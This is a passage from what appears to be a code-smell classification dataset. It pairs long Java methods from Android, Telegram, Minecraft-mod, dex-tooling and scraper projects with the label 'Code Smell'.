    while (itr.hasNext() && otherItr.hasNext()) {
      if (tuple.index == otherTuple.index) {
        score+=transformFunc.applyAsDouble(tuple.value - otherTuple.value);
        tuple=itr.next();
        otherTuple=otherItr.next();
      }
 else       if (tuple.index < otherTuple.index) {
        score+=transformFunc.applyAsDouble(tuple.value);
        tuple=itr.next();
      }
 else {
        score+=transformFunc.applyAsDouble(otherTuple.value);
        otherTuple=otherItr.next();
      }
    }
    while (itr.hasNext()) {
      if (tuple.index == otherTuple.index) {
        score+=transformFunc.applyAsDouble(tuple.value - otherTuple.value);
        otherTuple=new VectorTuple();
      }
 else {
        score+=transformFunc.applyAsDouble(tuple.value);
      }
      tuple=itr.next();
    }
    while (otherItr.hasNext()) {
      if (tuple.index == otherTuple.index) {
        score+=transformFunc.applyAsDouble(tuple.value - otherTuple.value);
        tuple=new VectorTuple();
      }
 else {
        score+=transformFunc.applyAsDouble(otherTuple.value);
      }
      otherTuple=otherItr.next();
    }
    if (tuple.index == otherTuple.index) {
      score+=transformFunc.applyAsDouble(tuple.value - otherTuple.value);
    }
 else {
      if (tuple.index != -1) {
        score+=transformFunc.applyAsDouble(tuple.value);
      }
      if (otherTuple.index != -1) {
        score+=transformFunc.applyAsDouble(otherTuple.value);
      }
    }
  }
 else   if (indices.length != 0) {
    for (    VectorTuple tuple : this) {
      score+=transformFunc.applyAsDouble(tuple.value);
    }
  }
 else {
    for (    VectorTuple tuple : other) {
      score+=transformFunc.applyAsDouble(tuple.value);
    }
  }
  return normalizeFunc.applyAsDouble(score);
}",1,Code Smell
"/** 
 * Wrapper for  {@link #startActivityForResult(Context,int,Intent,boolean,boolean,ActivityResultLauncher)}.
 */
public static Error startActivityForResult(Context context,int requestCode,@NonNull Intent intent){
  return startActivityForResult(context,requestCode,intent,true,true,null);
}
/** 
 * Wrapper for  {@link #startActivityForResult(Context,int,Intent,boolean,boolean,ActivityResultLauncher)}.
 */
public static Error startActivityForResult(Context context,int requestCode,@NonNull Intent intent,boolean logErrorMessage,boolean showErrorMessage){
  return startActivityForResult(context,requestCode,intent,logErrorMessage,showErrorMessage,null);
}
/** 
 * Start an  {@link Activity} for result.
 * @param context The context for operations. It must be an instance of {@link Activity} or{@link AppCompatActivity}. It is ignored if  {@code activityResultLauncher}is not  {@code null}.
 * @param requestCode The request code to use while sending intent. This must be >= 0, otherwiseexception will be raised. This is ignored if  {@code activityResultLauncher}is  {@code null}.
 * @param intent The {@link Intent} to send to start the activity.
 * @param logErrorMessage If an error message should be logged if failed to start activity.
 * @param showErrorMessage If an error message toast should be shown if failed to start activityin addition to logging a message. The  {@code context} must not be{@code null}.
 * @param activityResultLauncher The {@link ActivityResultLauncher<Intent>} to use for start theactivity. If this is  {@code null}, then {@link Activity#startActivityForResult(Intent,int)} will beused instead. Note that later is deprecated.
 * @return Returns the {@code error} if starting activity was not successful, otherwise {@code null}.
 */
public static Error startActivityForResult(Context context,int requestCode,@NonNull Intent intent,boolean logErrorMessage,boolean showErrorMessage,@Nullable ActivityResultLauncher<Intent> activityResultLauncher){
  Error error;
  String activityName=intent.getComponent() != null ? intent.getComponent().getClassName() : ""Unknown"";
  try {
    if (activityResultLauncher != null) {
      activityResultLauncher.launch(intent);
    }
 else {
      if (context == null) {
        error=ActivityErrno.ERRNO_STARTING_ACTIVITY_WITH_NULL_CONTEXT.getError(activityName);
        if (logErrorMessage)         error.logErrorAndShowToast(null,LOG_TAG);
        return error;
      }
      if (context instanceof AppCompatActivity)       ((AppCompatActivity)context).startActivityForResult(intent,requestCode);
 else       if (context instanceof Activity)       ((Activity)context).startActivityForResult(intent,requestCode);
 else {
        error=FunctionErrno.ERRNO_PARAMETER_NOT_INSTANCE_OF.getError(""context"",""startActivityForResult"",""Activity or AppCompatActivity"");
        if (logErrorMessage)         error.logErrorAndShowToast(showErrorMessage ? context : null,LOG_TAG);
        return error;
      }
    }
  }
 catch (  Exception e) {
    error=ActivityErrno.ERRNO_START_ACTIVITY_FOR_RESULT_FAILED_WITH_EXCEPTION.getError(e,activityName,e.getMessage());
    if (logErrorMessage)     error.logErrorAndShowToast(showErrorMessage ? context : null,LOG_TAG);
    return error;
  }
  return null;
}",1,Code Smell
"private void tryMultiPlace(BlockPlaceContext ctx){
  Player player=ctx.getPlayer();
  if (player == null)   return;
  if (player.isShiftKeyDown())   return;
  Direction face=ctx.getClickedFace();
  ItemStack stack=ctx.getItemInHand();
  Level world=ctx.getLevel();
  BlockPos pos=ctx.getClickedPos();
  BlockPos placedOnPos=pos.relative(face.getOpposite());
  BlockState placedOnState=world.getBlockState(placedOnPos);
  if (!ItemVaultBlock.isVault(placedOnState))   return;
  if (SymmetryWandItem.presentInHotbar(player))   return;
  ItemVaultBlockEntity tankAt=ConnectivityHandler.partAt(AllBlockEntityTypes.ITEM_VAULT.get(),world,placedOnPos);
  if (tankAt == null)   return;
  ItemVaultBlockEntity controllerBE=tankAt.getControllerBE();
  if (controllerBE == null)   return;
  int width=controllerBE.radius;
  if (width == 1)   return;
  int tanksToPlace=0;
  Axis vaultBlockAxis=ItemVaultBlock.getVaultBlockAxis(placedOnState);
  if (vaultBlockAxis == null)   return;
  if (face.getAxis() != vaultBlockAxis)   return;
  Direction vaultFacing=Direction.fromAxisAndDirection(vaultBlockAxis,AxisDirection.POSITIVE);
  BlockPos startPos=face == vaultFacing.getOpposite() ? controllerBE.getBlockPos().relative(vaultFacing.getOpposite()) : controllerBE.getBlockPos().relative(vaultFacing,controllerBE.length);
  if (VecHelper.getCoordinate(startPos,vaultBlockAxis) != VecHelper.getCoordinate(pos,vaultBlockAxis))   return;
  for (int xOffset=0; xOffset < width; xOffset++) {
    for (int zOffset=0; zOffset < width; zOffset++) {
      BlockPos offsetPos=vaultBlockAxis == Axis.X ? startPos.offset(0,xOffset,zOffset) : startPos.offset(xOffset,zOffset,0);
      BlockState blockState=world.getBlockState(offsetPos);
      if (ItemVaultBlock.isVault(blockState))       continue;
      if (!blockState.canBeReplaced())       return;
      tanksToPlace++;
    }
  }
  if (!player.isCreative() && stack.getCount() < tanksToPlace)   return;
  for (int xOffset=0; xOffset < width; xOffset++) {
    for (int zOffset=0; zOffset < width; zOffset++) {
      BlockPos offsetPos=vaultBlockAxis == Axis.X ? startPos.offset(0,xOffset,zOffset) : startPos.offset(xOffset,zOffset,0);
      BlockState blockState=world.getBlockState(offsetPos);
      if (ItemVaultBlock.isVault(blockState))       continue;
      BlockPlaceContext context=BlockPlaceContext.at(ctx,offsetPos,face);
      player.getPersistentData().putBoolean(""SilenceVaultSound"",true);
      super.place(context);
      player.getPersistentData().remove(""SilenceVaultSound"");
    }
  }
}",1,Code Smell
"/** 
 * Dumps any method with the given name in the given file.
 * @param dex {@code non-null;} the dex file
 * @param fqName {@code non-null;} the fully-qualified name of the method(s)
 * @param out {@code non-null;} where to dump to
 */
private void dumpMethod(DexFile dex,String fqName,OutputStreamWriter out){
  boolean wildcard=fqName.endsWith(""*"");
  int lastDot=fqName.lastIndexOf('.');
  if ((lastDot <= 0) || (lastDot == (fqName.length() - 1))) {
    context.err.println(""bogus fully-qualified method name: "" + fqName);
    return;
  }
  String className=fqName.substring(0,lastDot).replace('.','/');
  String methodName=fqName.substring(lastDot + 1);
  ClassDefItem clazz=dex.getClassOrNull(className);
  if (clazz == null) {
    context.err.println(""no such class: "" + className);
    return;
  }
  if (wildcard) {
    methodName=methodName.substring(0,methodName.length() - 1);
  }
  ArrayList<EncodedMethod> allMeths=clazz.getMethods();
  TreeMap<CstNat,EncodedMethod> meths=new TreeMap<CstNat,EncodedMethod>();
  for (  EncodedMethod meth : allMeths) {
    String methName=meth.getName().getString();
    if ((wildcard && methName.startsWith(methodName)) || (!wildcard && methName.equals(methodName))) {
      meths.put(meth.getRef().getNat(),meth);
    }
  }
  if (meths.size() == 0) {
    context.err.println(""no such method: "" + fqName);
    return;
  }
  PrintWriter pw=new PrintWriter(out);
  for (  EncodedMethod meth : meths.values()) {
    meth.debugPrint(pw,args.verboseDump);
    CstString sourceFile=clazz.getSourceFile();
    if (sourceFile != null) {
      pw.println(""  source file: "" + sourceFile.toQuoted());
    }
    Annotations methodAnnotations=clazz.getMethodAnnotations(meth.getRef());
    AnnotationsList parameterAnnotations=clazz.getParameterAnnotations(meth.getRef());
    if (methodAnnotations != null) {
      pw.println(""  method annotations:"");
      for (      Annotation a : methodAnnotations.getAnnotations()) {
        pw.println(""    "" + a);
      }
    }
    if (parameterAnnotations != null) {
      pw.println(""  parameter annotations:"");
      int sz=parameterAnnotations.size();
      for (int i=0; i < sz; i++) {
        pw.println(""    parameter "" + i);
        Annotations annotations=parameterAnnotations.get(i);
        for (        Annotation a : annotations.getAnnotations()) {
          pw.println(""      "" + a);
        }
      }
    }
  }
  pw.flush();
}",1,Code Smell
"public String getContentForDetailsAppearance(){
  Context context=TUIChatService.getAppContext();
  boolean isGroup=(participantType == CALL_PARTICIPANT_TYPE_GROUP);
  if (protocolType == CALL_PROTOCOL_TYPE_UNKNOWN) {
    return context.getString(R.string.invalid_command);
  }
  String content=context.getString(R.string.invalid_command);
  String senderShowName=getDisplayName();
  if (protocolType == CALL_PROTOCOL_TYPE_SEND) {
    content=isGroup ? (""\"""" + senderShowName + ""\""""+ context.getString(R.string.start_group_call)) : (context.getString(R.string.start_call));
  }
 else   if (protocolType == CALL_PROTOCOL_TYPE_ACCEPT) {
    content=isGroup ? (""\"""" + senderShowName + ""\""""+ context.getString(R.string.accept_call)) : context.getString(R.string.accept_call);
  }
 else   if (protocolType == CALL_PROTOCOL_TYPE_REJECT) {
    content=isGroup ? (""\"""" + senderShowName + ""\""""+ context.getString(R.string.reject_group_calls)) : context.getString(R.string.reject_calls);
  }
 else   if (protocolType == CALL_PROTOCOL_TYPE_CANCEL) {
    content=isGroup ? context.getString(R.string.cancle_group_call) : context.getString(R.string.cancle_call);
  }
 else   if (protocolType == CALL_PROTOCOL_TYPE_HANGUP) {
    content=isGroup ? context.getString(R.string.stop_group_call) : context.getString(R.string.stop_call_tip) + DateTimeUtil.formatSecondsTo00(duration);
  }
 else   if (protocolType == CALL_PROTOCOL_TYPE_TIMEOUT) {
    StringBuilder mutableContent=new StringBuilder();
    if (isGroup) {
      for (      String invitee : getParticipants()) {
        mutableContent.append(""\"""");
        mutableContent.append(invitee);
        mutableContent.append(""\""、"");
      }
      if (mutableContent.length() > 0) {
        mutableContent.delete(mutableContent.length() - 1,mutableContent.length());
      }
    }
    mutableContent.append(context.getString(R.string.no_response_call));
    content=mutableContent.toString();
  }
 else   if (protocolType == CALL_PROTOCOL_TYPE_LINE_BUSY) {
    content=isGroup ? (""\"""" + senderShowName + ""\""""+ context.getString(R.string.line_busy)) : context.getString(R.string.other_line_busy);
  }
 else   if (protocolType == CALL_PROTOCOL_TYPE_SWITCH_TO_AUDIO) {
    content=context.getString(R.string.chat_calling_switch_to_audio);
  }
 else   if (protocolType == CALL_PROTOCOL_TYPE_SWITCH_TO_AUDIO_COMFIRM) {
    content=context.getString(R.string.chat_calling_switch_to_audio_accept);
  }
  return content;
}",1,Code Smell
"public static void checkType(Type paramType,Set<Class<?>> avroTypes){
  if (paramType == null) {
    return;
  }
  boolean container=isContainer(paramType);
  if (!container && paramType instanceof Class) {
    MergedAnnotations mergedAnnotations=MergedAnnotations.from((Class<?>)paramType);
    if (mergedAnnotations.get(AVRO_GENERATED_CLASS_NAME).isPresent()) {
      avroTypes.add((Class<?>)paramType);
    }
  }
 else   if (container) {
    if (paramType instanceof ParameterizedType) {
      Type[] generics=((ParameterizedType)paramType).getActualTypeArguments();
      if (generics.length > 0) {
        checkAvro(generics[0],avroTypes);
      }
      if (generics.length == 2) {
        checkAvro(generics[1],avroTypes);
      }
    }
  }
}",1,Code Smell
"public void add(ClassEntity entity){
  add(entity,false);
}
public void add(ClassEntity entity,boolean fromCache){
  final Node current=getOrPutEmpty((entity.access & Opcodes.ACC_INTERFACE) != 0,entity.name);
  if (!current.defined.compareAndSet(false,true)) {
    if (fromCache) {
      return;
    }
    if (!entity.fromAndroid && !isCacheValid()) {
      String msg=String.format(""We found duplicate %s class files in the project."",current.entity.name);
      if (BooleanProperty.ENABLE_DUPLICATE_CLASS_CHECK.value() && !""module-info"".equals(current.entity.name)) {
        throw new DuplicateClassException(msg);
      }
 else {
        LevelLog.sDefaultLogger.e(msg);
      }
    }
  }
  ClassNode superNode=null;
  List<InterfaceNode> interfaceNodes=Collections.emptyList();
  if (entity.superName != null) {
    Node node=getOrPutEmpty(false,entity.superName);
    if (node instanceof ClassNode) {
      superNode=(ClassNode)node;
      if (current instanceof ClassNode) {
synchronized (superNode) {
          if (superNode.children == Collections.EMPTY_LIST) {
            superNode.children=new LinkedList<>();
          }
          superNode.children.add((ClassNode)current);
        }
      }
    }
 else {
      throw new RuntimeException(String.format(""%s is not a class. Maybe there are duplicate class files in the project."",entity.superName));
    }
  }
  if (entity.interfaces.size() > 0) {
    interfaceNodes=entity.interfaces.stream().map(i -> {
      Node node=getOrPutEmpty(true,i);
      if (node instanceof InterfaceNode) {
        final InterfaceNode interfaceNode=(InterfaceNode)node;
synchronized (interfaceNode) {
          if (current instanceof InterfaceNode) {
            if (interfaceNode.children == Collections.EMPTY_LIST) {
              interfaceNode.children=new LinkedList<>();
            }
            interfaceNode.children.add((InterfaceNode)current);
          }
 else           if (current instanceof ClassNode) {
            if (interfaceNode.implementedClasses == Collections.EMPTY_LIST) {
              interfaceNode.implementedClasses=new LinkedList<>();
            }
            interfaceNode.implementedClasses.add((ClassNode)current);
          }
        }
        return (InterfaceNode)node;
      }
 else {
        throw new RuntimeException(String.format(""%s is not a interface. Maybe there are duplicate class files in the project."",i));
      }
    }
).collect(Collectors.toList());
  }
  current.entity=entity;
  current.parent=superNode;
  current.interfaces=interfaceNodes;
}",1,Code Smell
"private BlockState updateColumn(Level level,BlockPos pos,BlockState state,boolean present){
  MutableBlockPos currentPos=new MutableBlockPos();
  Axis axis=state.getValue(AXIS);
  for (  Direction connection : Iterate.directions) {
    if (connection.getAxis() == axis)     continue;
    boolean connect=true;
    Move:     for (    Direction movement : Iterate.directionsInAxis(axis)) {
      currentPos.set(pos);
      for (int i=0; i < 1000; i++) {
        if (!level.isLoaded(currentPos))         break;
        BlockState other1=currentPos.equals(pos) ? state : level.getBlockState(currentPos);
        BlockState other2=level.getBlockState(currentPos.relative(connection));
        boolean col1=canConnect(state,other1);
        boolean col2=canConnect(state,other2);
        currentPos.move(movement);
        if (!col1 && !col2)         break;
        if (col1 && col2)         continue;
        connect=false;
        break Move;
      }
    }
    state=setConnection(state,connection,connect);
  }
  return state;
}",1,Code Smell
"/** 
 * Deserialization factory.
 * @param version The serialized object version.
 * @param className The class name.
 * @param message The serialized data.
 * @throws InvalidProtocolBufferException If the protobuf could not be parsed from the {@code message}.
 * @return The deserialized object.
 */
@SuppressWarnings({""unchecked"",""rawtypes""}) public static ArrayExample<?> deserializeFromProto(int version,String className,Any message) throws InvalidProtocolBufferException {
  if (version < 0 || version > CURRENT_VERSION) {
    throw new IllegalArgumentException(""Unknown version "" + version + "", this class supports at most version ""+ CURRENT_VERSION);
  }
  IndexedArrayExampleProto proto=message.unpack(IndexedArrayExampleProto.class);
  if ((proto.getFeatureNameCount() != proto.getFeatureValueCount()) || (proto.getFeatureNameCount() != proto.getFeatureIdxCount())) {
    throw new IllegalStateException(""Invalid protobuf, different numbers of feature names, ids and values, found "" + proto.getFeatureNameCount() + "" names, ""+ proto.getFeatureIdxCount()+ "" ids, and ""+ proto.getFeatureValueCount()+ "" values."");
  }
  Output<?> output=ProtoUtil.deserialize(proto.getOutput());
  int outputID=proto.getOutputIdx();
  FeatureMap fmap=ProtoUtil.deserialize(proto.getFeatureDomain());
  if (!(fmap instanceof ImmutableFeatureMap)) {
    throw new IllegalStateException(""Invalid protobuf, feature domain was not ImmutableFeatureMap, found "" + fmap.getClass());
  }
  ImmutableFeatureMap featureDomain=(ImmutableFeatureMap)fmap;
  OutputInfo<?> outputMap=ProtoUtil.deserialize(proto.getOutputDomain());
  if (!(outputMap instanceof ImmutableOutputInfo)) {
    throw new IllegalStateException(""Invalid protobuf, output domain was not ImmutableOutputInfo, found "" + outputMap.getClass());
  }
  ImmutableOutputInfo outputDomain=(ImmutableOutputInfo<?>)outputMap;
  if (output.getClass() != outputDomain.getDomain().iterator().next().getClass()) {
    throw new IllegalStateException(""Invalid protobuf, output type did not match domain type, output "" + output.getClass() + "", output domain ""+ outputDomain.getClass());
  }
 else   if (outputID != outputDomain.getID(output)) {
    throw new IllegalStateException(""Invalid protobuf, output id did not match the id from the domain, found "" + outputID + "", expected ""+ outputDomain.getID(output));
  }
  String[] featureNames=new String[proto.getFeatureNameCount()];
  int[] featureIDs=new int[proto.getFeatureIdxCount()];
  double[] featureValues=new double[proto.getFeatureValueCount()];
  for (int i=0; i < proto.getFeatureNameCount(); i++) {
    featureNames[i]=proto.getFeatureName(i);
    featureIDs[i]=proto.getFeatureIdx(i);
    if (featureIDs[i] != featureDomain.getID(featureNames[i])) {
      throw new IllegalStateException(""Invalid protobuf, feature id did not match the id from the domain, found "" + featureIDs[i] + "", expected ""+ featureDomain.getID(featureNames[i]));
    }
    featureValues[i]=proto.getFeatureValue(i);
  }
  return new IndexedArrayExample(output,outputID,proto.getWeight(),featureNames,featureIDs,featureValues,proto.getMetadataMap(),featureDomain,outputDomain);
}",1,Code Smell
"@UiThread public static void prepareSendingDocuments(AccountInstance accountInstance,ArrayList<String> paths,ArrayList<String> originalPaths,ArrayList<Uri> uris,String caption,String mime,long dialogId,MessageObject replyToMsg,MessageObject replyToTopMsg,TL_stories.StoryItem storyItem,ChatActivity.ReplyQuote quote,MessageObject editingMessageObject,boolean notify,int scheduleDate,InputContentInfoCompat inputContent,String quickReplyShortcut,int quickReplyShortcutId){
  if (paths == null && originalPaths == null && uris == null || paths != null && originalPaths != null && paths.size() != originalPaths.size()) {
    return;
  }
  Utilities.globalQueue.postRunnable(() -> {
    int error=0;
    long[] groupId=new long[1];
    int mediaCount=0;
    Integer[] docType=new Integer[1];
    boolean isEncrypted=DialogObject.isEncryptedDialog(dialogId);
    if (paths != null) {
      int count=paths.size();
      for (int a=0; a < count; a++) {
        final String captionFinal=a == 0 ? caption : null;
        if (!isEncrypted && count > 1 && mediaCount % 10 == 0) {
          if (groupId[0] != 0) {
            finishGroup(accountInstance,groupId[0],scheduleDate);
          }
          groupId[0]=Utilities.random.nextLong();
          mediaCount=0;
        }
        mediaCount++;
        long prevGroupId=groupId[0];
        error=prepareSendingDocumentInternal(accountInstance,paths.get(a),originalPaths.get(a),null,mime,dialogId,replyToMsg,replyToTopMsg,storyItem,quote,null,editingMessageObject,groupId,mediaCount == 10 || a == count - 1,captionFinal,notify,scheduleDate,docType,inputContent == null,quickReplyShortcut,quickReplyShortcutId);
        if (prevGroupId != groupId[0] || groupId[0] == -1) {
          mediaCount=1;
        }
      }
    }
    if (uris != null) {
      groupId[0]=0;
      mediaCount=0;
      int count=uris.size();
      for (int a=0; a < uris.size(); a++) {
        final String captionFinal=a == 0 && (paths == null || paths.size() == 0) ? caption : null;
        if (!isEncrypted && count > 1 && mediaCount % 10 == 0) {
          if (groupId[0] != 0) {
            finishGroup(accountInstance,groupId[0],scheduleDate);
          }
          groupId[0]=Utilities.random.nextLong();
          mediaCount=0;
        }
        mediaCount++;
        long prevGroupId=groupId[0];
        error=prepareSendingDocumentInternal(accountInstance,null,null,uris.get(a),mime,dialogId,replyToMsg,replyToTopMsg,storyItem,quote,null,editingMessageObject,groupId,mediaCount == 10 || a == count - 1,captionFinal,notify,scheduleDate,docType,inputContent == null,quickReplyShortcut,quickReplyShortcutId);
        if (prevGroupId != groupId[0] || groupId[0] == -1) {
          mediaCount=1;
        }
      }
    }
    if (inputContent != null) {
      inputContent.releasePermission();
    }
    handleError(error,accountInstance);
  }
);
}",1,Code Smell
"@Override public void onClick(View v){
  GroupCreateSpan span=(GroupCreateSpan)v;
  if (span.isDeleting()) {
    currentDeletingSpan=null;
    spansContainer.removeSpan(span);
    if (type == TYPE_PRIVATE) {
      if (span.getUid() == Long.MIN_VALUE + 8) {
        filterFlags&=~BusinessRecipientsHelper.PRIVATE_FLAG_EXISTING_CHATS;
      }
 else       if (span.getUid() == Long.MIN_VALUE + 9) {
        filterFlags&=~BusinessRecipientsHelper.PRIVATE_FLAG_NEW_CHATS;
      }
 else       if (span.getUid() == Long.MIN_VALUE) {
        filterFlags&=~BusinessRecipientsHelper.PRIVATE_FLAG_CONTACTS;
      }
 else       if (span.getUid() == Long.MIN_VALUE + 1) {
        filterFlags&=~BusinessRecipientsHelper.PRIVATE_FLAG_NON_CONTACTS;
      }
    }
 else {
      if (span.getUid() == Long.MIN_VALUE) {
        filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_CONTACTS;
      }
 else       if (span.getUid() == Long.MIN_VALUE + 1) {
        filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_NON_CONTACTS;
      }
 else       if (span.getUid() == Long.MIN_VALUE + 2) {
        filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_GROUPS;
      }
 else       if (span.getUid() == Long.MIN_VALUE + 3) {
        filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_CHANNELS;
      }
 else       if (span.getUid() == Long.MIN_VALUE + 4) {
        filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_BOTS;
      }
 else       if (span.getUid() == Long.MIN_VALUE + 5) {
        filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_MUTED;
      }
 else       if (span.getUid() == Long.MIN_VALUE + 6) {
        filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_READ;
      }
 else       if (span.getUid() == Long.MIN_VALUE + 7) {
        filterFlags&=~MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_ARCHIVED;
      }
    }
    updateHint();
    checkVisibleRows();
  }
 else {
    if (currentDeletingSpan != null) {
      currentDeletingSpan.cancelDeleteAnimation();
    }
    currentDeletingSpan=span;
    span.startDeleteAnimation();
  }
}",1,Code Smell
"private void onDownEvent(final int x,final int y,final long eventTime,final KeyDetector keyDetector){
  setKeyDetectorInner(keyDetector);
  if (DEBUG_EVENT) {
    printTouchEvent(""onDownEvent:"",x,y,eventTime);
  }
  final long deltaT=eventTime - mUpTime;
  if (deltaT < sParams.mTouchNoiseThresholdTime) {
    final int distance=getDistance(x,y,mLastX,mLastY);
    if (distance < sParams.mTouchNoiseThresholdDistance) {
      if (DEBUG_MODE)       Log.w(TAG,String.format(""[%d] onDownEvent:"" + "" ignore potential noise: time=%d distance=%d"",mPointerId,deltaT,distance));
      cancelTrackingForAction();
      return;
    }
  }
  final Key key=getKeyOn(x,y);
  mBogusMoveEventDetector.onActualDownEvent(x,y);
  if (key != null && key.isModifier()) {
    if (sInGesture) {
      return;
    }
 else {
      sPointerTrackerQueue.releaseAllPointers(eventTime);
    }
  }
  sPointerTrackerQueue.add(this);
  onDownEventInternal(x,y,eventTime);
  if (!sGestureEnabler.shouldHandleGesture()) {
    return;
  }
  mIsDetectingGesture=(mKeyboard != null) && mKeyboard.mId.isAlphabetKeyboard() && key != null && !key.isModifier();
  if (mIsDetectingGesture) {
    mBatchInputArbiter.addDownEventPoint(x,y,eventTime,sTypingTimeRecorder.getLastLetterTypingTime(),getActivePointerTrackerCount());
    mGestureStrokeDrawingPoints.onDownEvent(x,y,mBatchInputArbiter.getElapsedTimeSinceFirstDown(eventTime));
  }
}
",1,Code Smell
"public synchronized void calculateProperties(ResourcePack resourcePack){
  if (elements == null)   return;
  for (  Element element : elements) {
    if (element != null && element.isFullCube()) {
      occluding=true;
      culling=true;
      for (      Direction dir : Direction.values()) {
        Face face=element.getFaces().get(dir);
        if (face == null) {
          culling=false;
          break;
        }
        ResourcePath<Texture> textureResourcePath=face.getTexture().getTexturePath(textures::get);
        if (textureResourcePath == null) {
          culling=false;
          break;
        }
        Texture texture=textureResourcePath.getResource(resourcePack::getTexture);
        if (texture == null || texture.getColorStraight().a < 1) {
          culling=false;
          break;
        }
      }
      break;
    }
  }
}",1,Code Smell
"/** 
 * Reads an up to 64 bit long varint from the current position of the given ByteBuffer and returns the decoded value as long. <p> The position of the buffer is advanced to the first byte after the decoded varint.
 * @param src the ByteBuffer to get the var int from
 * @return The integer value of the decoded long varint
 */
public static long getVarLong(ByteBuffer src){
  long tmp;
  if ((tmp=src.get()) >= 0) {
    return tmp;
  }
  long result=tmp & 0x7f;
  if ((tmp=src.get()) >= 0) {
    result|=tmp << 7;
  }
 else {
    result|=(tmp & 0x7f) << 7;
    if ((tmp=src.get()) >= 0) {
      result|=tmp << 14;
    }
 else {
      result|=(tmp & 0x7f) << 14;
      if ((tmp=src.get()) >= 0) {
        result|=tmp << 21;
      }
 else {
        result|=(tmp & 0x7f) << 21;
        if ((tmp=src.get()) >= 0) {
          result|=tmp << 28;
        }
 else {
          result|=(tmp & 0x7f) << 28;
          if ((tmp=src.get()) >= 0) {
            result|=tmp << 35;
          }
 else {
            result|=(tmp & 0x7f) << 35;
            if ((tmp=src.get()) >= 0) {
              result|=tmp << 42;
            }
 else {
              result|=(tmp & 0x7f) << 42;
              if ((tmp=src.get()) >= 0) {
                result|=tmp << 49;
              }
 else {
                result|=(tmp & 0x7f) << 49;
                if ((tmp=src.get()) >= 0) {
                  result|=tmp << 56;
                }
 else {
                  result|=(tmp & 0x7f) << 56;
                  result|=((long)src.get()) << 63;
                }
              }
            }
          }
        }
      }
    }
  }
  return result;
}",1,Code Smell
"/** 
 * 鑾峰彇瑙嗛鎾斁淇℃伅
 * @param flag     鎾斁婧�
 * @param id       瑙嗛id
 * @param vipFlags 鎵�鏈夊彲鑳介渶瑕乿ip瑙ｆ瀽鐨勬簮
 * @return
 */
@Override public String playerContent(String flag,String id,List<String> vipFlags){
  try {
    String url=siteUrl + id;
    Document doc=Jsoup.parse(OkHttpUtil.string(url,getHeaders(url)));
    Elements e=doc.select(""div>script"");
    String player="""";
    String pn="""";
    JSONObject result=new JSONObject();
    for (    Element element : e) {
      String[] data=element.data().toString().split(""var"");
      for (      String variable : data) {
        if (variable.contains(""="")) {
          if (variable.contains(""now"")) {
            String[] kvp=variable.split(""="");
            player=kvp[1].replaceAll(""\"""","""").replaceAll("";"","""");
            if (player.startsWith(""base64"")) {
              String[] plist1=player.split(""\\("");
              String[] plist2=plist1[1].split(""\\)"");
              player=new String(Base64.decode(plist2[0].getBytes(),Base64.DEFAULT));
            }
            if (!player.startsWith(""http"")) {
              player=siteUrl + player;
            }
          }
          if (variable.contains(""pn"")) {
            String[] kvp=variable.split(""="");
            pn=kvp[1].replaceAll(""\"""","""").replaceAll("";"","""");
          }
        }
      }
      if (playerConfig.has(pn)) {
        JSONObject pCfg=playerConfig.getJSONObject(pn);
        String videoUrl=player;
        String playUrl=pCfg.getString(""pu"");
        result.put(""parse"",pCfg.getInt(""sn""));
        result.put(""playUrl"",playUrl);
        result.put(""url"",videoUrl);
        result.put(""header"","""");
      }
    }
    return result.toString();
  }
 catch (  Exception e) {
    SpiderDebug.log(e);
  }
  return """";
}",1,Code Smell
"@EventHandler private void onTick(TickEvent.Post event){
  if (isFull()) {
    if (walkHome.get()) {
      if (isBaritoneNotWalking()) {
        info(""Walking home."");
        baritone.getCustomGoalProcess().setGoalAndPath(new GoalBlock(homePos));
      }
 else       if (mc.player.getBlockPos().equals(homePos) && logOut.get())       logOut();
    }
 else     if (logOut.get())     logOut();
 else {
      info(""Inventory full, stopping process."");
      toggle();
    }
    return;
  }
  if (!findPickaxe()) {
    error(""Could not find a usable mending pickaxe."");
    toggle();
    return;
  }
  if (!checkThresholds()) {
    error(""Start mining value can't be lower than start repairing value."");
    toggle();
    return;
  }
  if (repairing) {
    if (!needsRepair()) {
      warning(""Finished repairing, going back to mining."");
      repairing=false;
      mineTargetBlocks();
      return;
    }
    if (isBaritoneNotMining())     mineRepairBlocks();
  }
 else {
    if (needsRepair()) {
      warning(""Pickaxe needs repair, beginning repair process"");
      repairing=true;
      mineRepairBlocks();
      return;
    }
    if (isBaritoneNotMining())     mineTargetBlocks();
  }
}
",1,Code Smell
"@Override public boolean onDoubleTap(MotionEvent e){
  if ((videoPlayer != null || photoViewerWebView != null && photoViewerWebView.isControllable()) && videoPlayerControlVisible) {
    long current=getCurrentVideoPosition();
    long total=getVideoDuration();
    float x=e.getX();
    int width=getContainerViewWidth();
    boolean forward=x >= width / 3 * 2;
    if (canDoubleTapSeekVideo(e)) {
      long old=current;
      if (x >= width / 3 * 2) {
        current+=10000;
      }
 else       if (x < width / 3) {
        current-=10000;
      }
      if (old != current) {
        boolean apply=true;
        if (current > total) {
          current=total;
        }
 else         if (current < 0) {
          if (current < -9000) {
            apply=false;
          }
          current=0;
        }
        if (apply) {
          videoForwardDrawable.setOneShootAnimation(true);
          videoForwardDrawable.setLeftSide(x < width / 3);
          videoForwardDrawable.addTime(10000);
          seekVideoOrWebTo(current);
          containerView.invalidate();
          videoPlayerSeekbar.setProgress(current / (float)total,true);
          videoPlayerSeekbarView.invalidate();
        }
        return true;
      }
    }
  }
  if (!canZoom || scale == 1.0f && (translationY != 0 || translationX != 0)) {
    return false;
  }
  if (animationStartTime != 0 || animationInProgress != 0) {
    return false;
  }
  if (photoProgressViews[0] != null && photoProgressViews[0].isVisible() && photoProgressViews[0].backgroundState != PROGRESS_NONE && Math.sqrt(Math.pow(AndroidUtilities.displaySize.x / 2f - e.getX(),2) + Math.pow((AndroidUtilities.displaySize.y + AndroidUtilities.statusBarHeight) / 2f - e.getY(),2)) < AndroidUtilities.dp(40)) {
    return false;
  }
  if (scale == 1.0f) {
